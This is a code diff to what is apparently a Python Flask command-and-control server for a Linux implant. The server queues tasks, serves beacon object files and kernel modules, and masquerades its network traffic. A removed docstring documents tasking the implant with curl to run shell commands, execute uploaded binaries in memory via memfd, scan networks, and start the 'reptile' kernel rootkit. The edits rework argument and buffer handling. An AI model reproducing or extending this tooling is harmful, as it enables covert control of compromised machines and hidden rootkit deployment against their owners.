@@ -11,60 +11,10 @@ from collections import deque
 import secrets
 from enum import IntEnum
 
-"""
-Tasking an implant to execute 'uname' BOF with '-r' arguemnt provided:
-curl -H 'Content-Type: application/json' http://127.0.0.1:8000/tasking -d '{
- "header" : "inline:z",
- "name" : "bof:uname",
- "argv" : "-r"
-}'
-
-Tasking an implant to execute 'uname' BOF with '-a' arguemnt and do not unload it after execution ('persist'):
-curl -H 'Content-Type: application/json' http://127.0.0.1:8000/tasking -d '{
- "header" : "inline:z:persist",
- "name" : "bof:uname",
- "argv" : "-a"
-}'
-
-Structure of tasks (running BOF and passing the buffer content to it):
-cmdData1 = {
-	"header" : "thread:zb",
-	"name" : "bof:udpScanner",
-	"argv" : "8.8.8.8:53",
-	"buffer" : "file:udpPayloads.txt",
-};
-
-Structure of tasks (running BOF ):
-cmdData0 = {
-	"header" : "callback:",
-	"name" : "bof:kernelModLoader",
-};
-
-Structure of tasks (running OS commands):
-cmdData2 = {
-	"header" : "inline:z",
-	"name" : "cmd:ls",
-	"argv" : "-al",
-};
-
-Structure of tasks (running shellcodes):
-cmdData3 = {
-	"header" : "inline:b",
-	"name" : "bin:memfdExecute",
-	"buffer" : "file:executableToUpload.exe",
-};
-
-Structure of tasks (running kernel modules):
-cmdData4 = {
-	"header" : "inline:z",
-	"name" : "mod:reptile",
-	"argv" : "start",
-};
-"""
 
 app = Flask(__name__)
 
-bofsRootDir = "/bofs/"
+bofsRootDir = "/BOF-bin/"
 kmodsRootDir = "/kmods/"
 
 # Fifo queue of tasks to execute by implant
@@ -133,7 +83,7 @@ def netMasquerade(Task, MsgType):
 
             csvString += value + ','
 
-            print(csvString)
+            print("Sending task to implant: " + csvString)
 
         return csvString
 
@@ -580,63 +530,25 @@ def constructImplantTask(taskJSON, implant_identity):
     # get args specification possible values: iszZb
     args_spec = header.split(':')[1]
 
-    # skip further processing if no arguments were provided
-    if args_spec == "":
-        return Instruction 
+    # count number of 'b' (buffer) arguments type
+    i=0
+    buf_count = 0
+    while i < len(args_spec):
+        if args_spec[i] == 'b':
+            buf_count += 1
+        i += 1 
 
     if 'argv' not in cmdData:
         return Instruction 
+    else:
+        Instruction['argv'] = cmdData['argv']
 
-    # prepare cmdData/Instruction for BOF-stager by iterating over 'argv' and inspecting args_spec
-    argv = cmdData['argv'].split(' ')
-    new_argv = ""
-    i = 0
-    buf_number = 0
-
-    if len(argv) != len(args_spec):
-        print("argv and args_spec mismatched length!")
-
-    while i < len(argv):
-        print(argv[i])
-        print(args_spec[i])
-        
-        if len(new_argv) > 0:
-            new_argv += " "
-
-        # zero-terminated string
-        if args_spec[i] == 'z':
-            argv[i] = "z:" + argv[i]
-            new_argv += argv[i]
-        # integer
-        elif args_spec[i] == 'i':
-            argv[i] = "i:" + argv[i]
-            new_argv += argv[i]
-        # short integer
-        elif args_spec[i] == 's':
-            argv[i] = "s:" + argv[i]
-            new_argv += argv[i]
-        elif args_spec[i] == 'b':
-            # prepare Instruction's field name
-            field_name = "buffer" + str(buf_number)
-            buf_number += 1
- 
-            # prepare Instruction's field content
-            if 'file:' in argv[i]:
-                _, path = argv[i].split(':')
-                with open(path, 'rb') as f:
-                    Instruction[field_name] = base64.b64encode(f.read()).decode('utf-8')
-            else:
-                # field is expected to be already base64 encoded
-                Instruction[field_name] = argv[i]
-
-            new_argv += str(field_name)
-
+    # populate implant's task ('Instruction' structure) with the buffers' content
+    i=0
+    while i < buf_count:
+        if "buffer" + str(i) in cmdData:
+            Instruction["buffer" + str(i)] = cmdData["buffer" + str(i)]
         i += 1
-
-    print("new_argv: " + new_argv)
-
-    # glue together all argv[i]'s and base64 encode it before sending
-    Instruction['argv'] = base64.b64encode(new_argv.encode('utf-8')).decode('utf-8')
 
     # return Implant's Instruction for execution
     return Instruction
@@ -647,7 +559,7 @@ def constructImplantTask(taskJSON, implant_identity):
 ### Resource serving endpoints
 @app.route(bofsRootDir + '<path:path>')
 def send_report(path):
-    resp = send_from_directory('bofs', path, mimetype='application/octet-stream')
+    resp = send_from_directory('BOF-bin', path, mimetype='application/octet-stream')
     return netMasquerade(resp, ImplantMessageType.GET_RESOURCE)
 
 @app.route(kmodsRootDir + '<path:path>')
